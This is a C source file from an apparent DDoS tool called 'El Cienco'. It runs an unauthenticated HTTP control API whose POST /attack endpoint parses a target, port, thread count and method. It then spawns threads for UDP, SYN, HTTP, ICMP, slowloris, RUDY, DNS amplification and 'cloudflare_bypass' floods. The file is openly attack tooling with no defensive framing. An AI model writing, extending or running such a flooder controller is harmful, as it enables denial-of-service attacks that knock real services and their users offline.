#include "../include/elcienco.h"

volatile int attack_running = 0;
pthread_t attack_threads[MAX_THREADS];

void *api_server(void *arg) {
    int server_fd, client_fd;
    struct sockaddr_in address;
    int opt = 1;
    socklen_t addrlen = sizeof(address);
    
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("API Socket failed");
        return NULL;
    }
    
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(API_PORT);
    
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("API Bind failed");
        return NULL;
    }
    
    if (listen(server_fd, 3) < 0) {
        perror("API Listen failed");
        return NULL;
    }
    
    printf("[API] El Cienco Control Interface listening on port %d\n", API_PORT);
    
    while (1) {
        client_fd = accept(server_fd, (struct sockaddr *)&address, &addrlen);
        if (client_fd >= 0) {
            handle_api_request(client_fd);
            close(client_fd);
        }
    }
    
    return NULL;
}

void handle_api_request(int client_fd) {
    char buffer[BUFFER_SIZE] = {0};
    char response[BUFFER_SIZE];
    AttackConfig config;
    
    read(client_fd, buffer, BUFFER_SIZE);
    printf("[API] Received: %s\n", buffer);
    
    // Parse HTTP request
    if (strstr(buffer, "POST /attack")) {
        char *json_start = strstr(buffer, "\r\n\r\n");
        if (json_start) {
            json_start += 4;
            parse_json_command(json_start, &config);
            
            // Launch attack based on method
            attack_running = 1;
            for (int i = 0; i < config.threads && i < MAX_THREADS; i++) {
                ThreadData *data = malloc(sizeof(ThreadData));
                data->config = config;
                data->thread_num = i;
                data->running = &attack_running;
                
                switch(config.method) {
                    case 0: pthread_create(&attack_threads[i], NULL, udp_flood, data); break;
                    case 1: pthread_create(&attack_threads[i], NULL, tcp_syn_flood, data); break;
                    case 2: pthread_create(&attack_threads[i], NULL, http_flood, data); break;
                    case 3: pthread_create(&attack_threads[i], NULL, slowloris_attack, data); break;
                    case 4: pthread_create(&attack_threads[i], NULL, dns_amplification, data); break;
                    case 5: pthread_create(&attack_threads[i], NULL, icmp_flood, data); break;
                    case 6: pthread_create(&attack_threads[i], NULL, rudyloris_attack, data); break;
                    case 7: pthread_create(&attack_threads[i], NULL, cloudflare_bypass, data); break;
                }
            }
            
            sprintf(response, 
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: application/json\r\n"
                "Access-Control-Allow-Origin: *\r\n"
                "\r\n"
                "{\"status\":\"ATTACK_INITIATED\",\"target\":\"%s\",\"port\":%d,\"threads\":%d,\"method\":%d}",
                config.target, config.port, config.threads, config.method
            );
        }
    } else if (strstr(buffer, "POST /stop")) {
        attack_running = 0;
        sprintf(response,
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: application/json\r\n"
            "Access-Control-Allow-Origin: *\r\n"
            "\r\n"
            "{\"status\":\"ATTACK_STOPPED\"}"
        );
    } else if (strstr(buffer, "GET /status")) {
        sprintf(response,
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: application/json\r\n"
            "Access-Control-Allow-Origin: *\r\n"
            "\r\n"
            "{\"running\":%d,\"active_threads\":%d}",
            attack_running, attack_running ? MAX_THREADS : 0
        );
    } else {
        sprintf(response,
            "HTTP/1.1 404 NOT FOUND\r\n"
            "Content-Type: application/json\r\n"
            "\r\n"
            "{\"error\":\"ENDPOINT_NOT_FOUND\"}"
        );
    }
    
    send(client_fd, response, strlen(response), 0);
}

void parse_json_command(char *json, AttackConfig *config) {
    // Simple JSON parser for embedded systems
    char *target_ptr = strstr(json, "\"target\"");
    char *port_ptr = strstr(json, "\"port\"");
    char *threads_ptr = strstr(json, "\"threads\"");
    char *duration_ptr = strstr(json, "\"duration\"");
    char *method_ptr = strstr(json, "\"method\"");
    
    if (target_ptr) {
        target_ptr += 9;
        while (*target_ptr == ':' || *target_ptr == '"' || *target_ptr == ' ') target_ptr++;
        sscanf(target_ptr, "%[^\"]", config->target);
    }
    
    if (port_ptr) {
        port_ptr += 6;
        while (*port_ptr == ':' || *port_ptr == ' ') port_ptr++;
        config->port = atoi(port_ptr);
    }
    
    if (threads_ptr) {
        threads_ptr += 9;
        while (*threads_ptr == ':' || *threads_ptr == ' ') threads_ptr++;
        config->threads = atoi(threads_ptr);
        if (config->threads > MAX_THREADS) config->threads = MAX_THREADS;
    }
    
    if (duration_ptr) {
        duration_ptr += 10;
        while (*duration_ptr == ':' || *duration_ptr == ' ') duration_ptr++;
        config->duration = atoi(duration_ptr);
    }
    
    if (method_ptr) {
        method_ptr += 8;
        while (*method_ptr == ':' || *method_ptr == ' ') method_ptr++;
        config->method = atoi(method_ptr);
    }
    
    printf("[PARSED] Target: %s:%d | Threads: %d | Method: %d\n", 
           config->target, config->port, config->threads, config->method);
}
